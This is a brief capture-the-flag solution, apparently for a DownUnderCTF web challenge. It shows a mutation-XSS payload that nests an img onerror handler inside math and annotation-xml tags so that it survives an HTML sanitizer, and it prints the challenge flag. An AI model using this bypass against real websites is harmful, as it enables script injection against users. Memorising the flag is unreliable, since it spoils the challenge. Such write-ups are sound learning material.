## Solution:
ref: https://jorianwoltjer.com/blog/p/research/mutation-xss

classic mutation xss, img src will survive because the sanitizer still thinks its inside mtext when the node is being removed.
```
<math><annotation-xml encoding="text/html"><style>
<mtext><img src=x onerror=alert(1)></mtext>
</style></annotation-xml></math>
```

Flag:  `DUCTF{if_y0u_d1dnt_us3_mutation_x5S_th3n_it_w45_un1nt3nded_435743723}`

Solved by: vicevirus